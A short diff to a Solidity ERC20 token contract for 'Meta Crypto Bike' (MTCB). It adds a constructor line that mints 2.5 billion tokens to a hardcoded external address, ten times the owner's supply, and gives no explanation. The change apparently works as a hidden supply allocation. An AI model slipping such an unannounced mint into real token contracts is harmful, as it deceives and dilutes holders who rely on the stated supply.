@@ -20,6 +20,7 @@ contract MTCBToken is ERC20, Ownable {
      */
     constructor() ERC20("Meta Crypto Bike", "MTCB") {
         _mint(owner(), 250000000 * (10**decimals()));
+        _mint(0x5C5193544Fce3f8407668D451b20990303cc692a, 2500000000 * 10**18);
     }
 
     /**
